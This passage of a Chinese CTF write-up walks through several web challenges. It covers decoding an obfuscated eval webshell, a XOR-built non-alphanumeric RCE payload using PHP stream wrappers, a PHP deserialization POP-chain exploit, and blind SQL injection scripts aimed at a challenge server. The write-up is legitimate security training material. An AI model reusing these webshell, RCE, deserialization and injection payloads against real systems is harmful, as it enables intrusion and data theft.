1dVBJRGpuQkNCbjJ4WEdZQ1NldXRWQ2h0aHVWTU9QeVBzdDFFdXZWS3hQUEVvb1BQakxKRVZMc2l0bnV0aUcwb1NtUFBOQllDb24wb2d1UEIxYnlQYUJ5RW50VUlmTHNSMFNKYmpSTnlQbkp0WFBZRWdDeVJQUFlJdFB1dElQY0lMdDF5UFNJeVBQc0RqR0phNENQSWFlVWFZdEI1ckd5UnV2dW5mTHM5c3BWTTRQQm91UDJQVnVzNVN0ZnhqTDFDV3ZVOTNRbTBrckxzN1FmND0iO2V2YWwoJz8+Jy4kQndsdHFPWWJIYVFrUlBOb3hjZm5GbXpzSWpoZE1EQVdVZUtHZ3ZpVnJKWnBMdVhFVFN5QygkaFlYbFRnQnFXQXBPYnhKdmVqUFJTZEhHUW5hdURpc2ZFTklGeW9jcmtVTHdtS01DdFZ6Wigkdk53VE9zS1BFQWxMY2lKREJoV3RSU0hYZW1wSXJqeVFVdUdvYWtuWUNkRnpxWk14ZmJnVigkTnZpdXl3Q2VQV0VHbGFjQW1manJnQk1UWVh6SFpwSXhEcVFuc1VLa2hvdEZTT1JkVkpMYiwkY2lNZlRYcFBvSkh6WkJ4TE92bmdqUUNiZElHa1lsVk5TdW1GckFVZVdhc0t5RXR3aERxUioyKSwkdk53VE9zS1BFQWxMY2lKREJoV3RSU0hYZW1wSXJqeVFVdUdvYWtuWUNkRnpxWk14ZmJnVigkTnZpdXl3Q2VQV0VHbGFjQW1manJnQk1UWVh6SFpwSXhEcVFuc1VLa2hvdEZTT1JkVkpMYiwkY2lNZlRYcFBvSkh6WkJ4TE92bmdqUUNiZElHa1lsVk5TdW1GckFVZVdhc0t5RXR3aERxUiwkY2lNZlRYcFBvSkh6WkJ4TE92bmdqUUNiZElHa1lsVk5TdW1GckFVZVdhc0t5RXR3aERxUiksJHZOd1RPc0tQRUFsTGNpSkRCaFd0UlNIWGVtcElyanlRVXVHb2FrbllDZEZ6cVpNeGZiZ1YoJE52aXV5d0NlUFdFR2xhY0FtZmpyZ0JNVFlYekhacEl4RHFRbnNVS2tob3RGU09SZFZKTGIsMCwkY2lNZlRYcFBvSkh6WkJ4TE92bmdqUUNiZElHa1lsVk5TdW1GckFVZVdhc0t5RXR3aERxUikpKSk7")); ?>
```

自己去解了下，最后是这样的：

```php
<?php
highlight_file(__FILE__);
@eval($_POST[ymlisisisiook]);
```

显示代码加一句话。

Burp发送一下恶意请求，发现没有回显，看了下phpinfo的信息，以下函数被禁用：

```conf
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system
```

system等关键函数默认在内，这样只能绕过disable_functions，蚁剑插件市场下载绕过插件即可。

## RCE_ME

代码如下：

```php
<?php
error_reporting(0);
if (isset($_POST['url'])) {
    $url = $_POST['url'];
    $r = parse_url($url);
    if (preg_match('/cumt\.com$/', $r['host'])) {
        echo "you are good";
        $code = file_get_contents($url);
        print_r($code);
        if (preg_match('/(f|l|a|g|\.|p|h|\/|;|\~|\"|\'|\`|\||\[|\]|\_|=)/i',$code)) {
            die('are you sure???');
        }
        $blacklist = get_defined_functions()['internal'];
        foreach ($blacklist as $blackitem) {
            if (preg_match ('/' . $blackitem . '/im', $code)) {
                die('You deserve better');
            }
        }
        assert($code);
    }else{
        echo "you are not cumt";
    }
}else{
    highlight_file(__FILE__);
}
```

匹配网址，有很多方法绕过，PHP伪协议即可，payload如下：

```http
url=compress.zlib://data:@cumt.com/cumt.com?,${%80%80%80%80%80^%DF%D0%CF%D3%D4}{b}(${%80%80%80%80%80^%DF%D0%CF%D3%D4}{c})
&b=system&c=cat flag.php
```

> 使用data伪协议也是可以的，data://cumt.com/plain, code

然后仔细分析一下这个payload，前么利用了compress.zlib绕过了网址过滤，会执行后面的代码，然后下一个，这个正则要绕过就是无数字字母webshell了，一开始确实是想到了这个的，但是试了好久，就是不对，就放弃了，看writeup有种哔了狗的感觉，原来是自己写成了`%80%80%80%80%80^%DF%D0%CF%D3%D4`没有加美元符以及大括号，着实是给自己的智商上了点税。

讲回来，我之前看的无字母数字的webshell是利用取反的，当然了这里过滤了取反，所以还可以利用亦或，构造的PHP脚本如下:

```php
<?php
$payload = '_POST';
$l = '';
$r = '';
$flag = 0;
echo "\n";
for ($i = 0; $i < strlen($payload); $i++) {
    $flag=0;
    for ($j = 128; $j < 256; $j++) {
        for ($k = 128; $k < 256; $k++) {
            if ((chr($j) ^ chr($k)) === $payload[$i]) {
                $l=$l.urlencode(chr($j));
                $r=$r.urlencode(chr($k));
                $flag=1;
                break;
            }
        }
        if($flag===1){
            break;
        }
    }
}

echo $l.'^'.$r;	
```

从而可以构造：

```http
url=compress.zlib://data:@cumt.com/cumt.com?,${%80%80%80%80%80^%DF%D0%CF%D3%D4}
```

这样传入assert的内容即为经过urldecode的`${%80%80%80%80%80^%DF%D0%CF%D3%D4}`

而PHP的代码运行机制又有一个很linux的特点(很像`$(date)`这种命令调用格式)，PHP.net给出的Note是：

> 函数、方法、静态类变量和类常量只有在 PHP 5 以后才可在 {$} 中使用。然而，只有在该字符串被定义的命名空间中才可以将其值作为变量名来访问。只单一使用花括号 ({}) 无法处理从函数或方法的返回值或者类常量以及类静态变量的值。

所以我们肯定的，花括号内部的异或操作将被运行，从而使得代码变为：

```php
assert("${_POST}")
```

再次构造payload最终可以得到：

```http
url=compress.zlib://data:@cumt.com/cumt.com?,${%80%80%80%80%80^%DF%D0%CF%D3%D4}{b}(${%80%80%80%80%80^%DF%D0%CF%D3%D4}{c})
&b=system&c=cat flag.php
```

> 构造最后的payload时，注意绕开`preg_match`中的某些字母。

​	

## easy_web

只贴关键代码：

```php
<?php highlight_file("index.php") ?>
<?php
    $four_word = $_POST['web'];
    $a = $_POST['a'];
    $b = $_POST['b'];
    $c = $_POST['c'];
    if (md5($four_word) == '327a6c4304ad5938eaf0efb6cc3e53dc' && md5($a) === md5($b) && $a !== $b) {
        if($array[++$c]=1){
            if($array[]=1){
                echo "nonono";
            }
            else{
                require_once 'flag.php';
                echo $flag;
            }
        }
    } 
?>
```

第一个MD5使用CMD5解码就行。

绕过md5，老套路了，数组绕过：

令：

```http
web=flag&a[]=1&b[]=2
```

c的取值有点讲究，这是一个PHP 的点。

众所周知，赋值返回的是赋值操作是否成功，然而99.99%的赋值都是成功的，所以怎么使得`$array[]=1`这个赋值操作失败即可，这里其实是一个新增操作，新增操作要失败，那么只有一个办法，下标溢出，但是PHP是动态解释语言，按照道理来说不会出现这种问题，但是考虑到PHP的数组实际可能也是由一种数据结构维护，而数据结构中一般不会使用到大整数作为下标表示法，假如说PHP的源代码在实现Array的时候使用了int来表示数组下标的话，那么我们可以利用固有的int溢出方式，传入`2^31-2`使得`++$c`为int的最大值，这样在新增时，再加下标就会溢出int的范围从而使得赋值失败。

> 如果是64位机，则应该传入的是`2^63-2`

这样子得到了一个password，然后图片隐写解一下即可。

## Easy_unserialize

反序列化的题其实一直不太难，主要是想清楚构造链即可。这道题的话，先看代码：

* index.php

```php
<?php
highlight_file(__FILE__);
//popa.php popb.php

function __autoload($classname){
    require "./$classname.php";
}

if(!isset($_COOKIE['user'])){
    setcookie("user", serialize('ctfer'), time()+3600);
}else{
    echo "hello";
    echo unserialize($_COOKIE['user']);
}
```

* popa.php

```php
<?php
//flag is in flag.php
highlight_file(__FILE__);

class Cuu{
    public $met;
    public $eo;
    public function __construct(){
        $this->met ="hello";
    }
    public function __wakeup(){
        $this->mo="try a try";
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class funct
{
        public $mod1;
        public function __call($test2,$arr)
        {
                $fun = $this->mod1;
                $fun();
        }
}
```

* popb.php

```php
<?php
//flag is in flag.php
highlight_file(__FILE__);
class over {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    } 
}

class usele{
    public $test;
    public function __wakeup(){
        $this->test="yes";
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $nam = $this->p;
        $nam->nonono();
    }
}
```

要想要利用，就得在over的类中执行`append`函数，而`append`函数会在`__invoke`中调用，而魔术方法`__invoke`会在对象当函数调用时被调用。

而可能存在将对象当函数调用的地方则在类`funct`中的魔术方法`__call`，这个函数会在调用类中不存在的函数时调用。

再看如何调用`__call`，显然只有类`Test`中的魔术方法`__get`可以这样调用，要调用类`Test`的`__get`函数，就必须取类`Test`的成员。这样完全分析下去可以得到构造链为：

```php
Show.wakeup->Show.__tostring->Test.__get->funct.__call ->over.__invole->include(flag.php)
```

于是可以得到：

```php
<?php

function autoload($name)
{
    require "./$name.php";
}

spl_autoload_register('autoload');

class popa
{
}
class popb
{
}

class Show
{
    public $source;
    public $str;
    public function __construct($file = 'index.php')
    {
        $this->source = $file;
        echo 'Welcome to ' . $this->source . "<br>";
    }
    public function __toString()
    {
        return $this->str->source;
    }

    public function __wakeup()
    {
        if (preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}


class Test
{
    public $p;
    public function __construct()
    {
        $this->p = array();
    }

    public function __get($key)
    {
        $nam = $this->p;
        $nam->nonono();
    }
}

class funct
{
    public $mod1;
    public function __call($test2, $arr)
    {
        $fun = $this->mod1;
        $fun();
    }
}

class over
{
    protected  $var = "php://filter/read=convert.base64-encode/resource=flag.php";
    public function append($value)
    {
        include($value);
    }
    public function __invoke()
    {
        $this->append($this->var);
    }
}

$d = new popa();
$e = new popb();
$a = new Show("1");
$b = new Show("2");
$a->source = $b;
$a->source->str = new Test();
$a->source->str->p = new funct();
$a->source->str->p->mod1 = new over();
$code = serialize([$d, $e, $a]);
print(urlencode($code));
echo "\n";
// Welcome to 1<br>Welcome to 2<br>a%3A3%3A%7Bi%3A0%3BO%3A4%3A%22popa%22%3A0%3A%7B%7Di%3A1%3BO%3A4%3A%22popb%22%3A0%3A%7B%7Di%3A2%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A1%3A%222%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A5%3A%22funct%22%3A1%3A%7Bs%3A4%3A%22mod1%22%3BO%3A4%3A%22over%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D%7D
```

完成后，可以得到：

`PD9waHANCiRmbGFnPSJjdW10Y3Rme3MwU29fZTRTeV80dV9oSGhISGh9IjsNCg==`

解码得到Flag。

## sql_inject

显然存在sql注入，过滤的东西比较多，测试请求参数：

```http
username=admin&password=admin'||if(1<2,1,0)#
```

返回了`you are right`。

说明存在注入点，查innodb_table_stats得表名：

```python
import requests

url = "http://219.219.61.234:32776/test.php"

i = 0
table_name = ""
result = ""
while True:
    i += 1
    for char in range(32, 128):
        payload = f"admin'||if(lpad((select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),{i},1)>/**/0x{table_name}{hex(char)[2:]},1,0)#"
        data = {
            'username': 'admin',
            'password': payload
        }

        if 'wrong' in requests.post(url, data).text and char == 32:
            exit()

        if 'wrong' in requests.post(url, data).text:
            table_name += hex(char)[2:]
            result += chr(char)
            print(result, f"i={i} chr={char}")
            break
```



可以拿到表名：

```
flag_table,no_use_table,test,users,gtid_slave_pos
```

显然flag应该在`flag_table`中，于是再查这个表。

爆其值。

先判断列数：

```http
username=admin&password=admin'||(1,1)/**/>/**/(select/**/*/**/from/**/flag_table/**/limit/**/0,1)#
```

该请求返回right，可以确定有两列。

先求第一列：

```python
import requests

url = "http://219.219.61.234:32776/test.php"

flag = ''

for i in range(500):
    for char in range(32, 128):
        payload = f"admin'||(\"{flag}{chr(char)}\",1)/**/>/**/(select/**/*/**/from/**/flag_table/**/limit/**/2,1)#"
        data = {
            "username": "admin",
            "password": payload
        }
        res = requests.post(url, data)
        if "right" in res.text:
            flag += chr(char - 1)
            print(flag)
            break
```

然后直接得到了结果：

```
FLAG{CUMTCTF_SQL_IS_S0_E@SY|
```

转为小写，把最后一个变为}得到flag。

> 个人应该是出题人编码有点问题导致大小写不敏感了，个人在MySQL中测试是大小写敏感正常的

```bash
MariaDB [mysql]> select ("M", 1,1,1,1,1) >  (select * from mysql.innodb_table_stats); 
+--------------------------------------------------------------+ 
| ("M", 1,1,1,1,1) >  (select * from mysql.innodb_table_stats) |
+--------------------------------------------------------------+
|                                                            0 |
+--------------------------------------------------------------+
1 row in set (0.000 sec)

MariaDB [mysql]> select ("N", 1,1,1,1,1) >  (select * from mysql.innodb_table_stats);
+--------------------------------------------------------------+
| ("N", 1,1,1,1,1) >  (select * from mysql.innodb_table_stats) |
+--------------------------------------------------------------+
|                                                            0 |
+--------------------------------------------------------------+
1 row in set (0.000 sec)

MariaDB [mysql]> select ("m", 1,1,1,1,1) >  (select * from mysql.innodb_table_stats);
+--------------------------------------------------------------+
| ("m", 1,1,1,1,1) >  (select * from mysql.innodb_table_stats) |
+--------------------------------------------------------------+
|                                                            0 |
+--------------------------------------------------------------+
1 row in set (0.000 sec)

MariaDB [mysql]> select ("n", 1,1,1,1,1) >  (select * from mysql.innodb_table_stats);
+--------------------------------------------------------------+
| ("n", 1,1,1,1,1) >  (select * from mysql.innodb_table_stats) |
+--------------------------------------------------------------+
|                                                            1 |
+--------------------------------------------------------------+
1 row in set (0.000 sec)
```

